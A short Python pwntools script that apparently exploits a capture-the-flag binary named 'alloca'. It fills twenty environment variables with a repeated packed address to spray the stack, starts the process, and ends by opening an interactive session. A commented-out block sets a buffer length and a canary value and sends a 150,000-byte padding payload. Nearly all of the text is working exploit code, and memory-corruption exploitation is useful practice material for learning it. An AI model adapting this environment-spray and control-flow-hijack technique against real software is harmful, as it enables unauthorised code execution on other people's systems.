from pwn import*

key = p32(0x080485ab)*10000
_env = {str(i):key for i in range(20)}

p = process('./alloca',env=_env)
'''
sleep(3)
p.recv()
p.sendline('140000')	# set length of buffer

sleep(2)

p.sendline('1')	# set canary

sleep(2)
raw_input()
pay = ''
pay += 'a'*150000
p.send(pay)
'''
p.interactive()
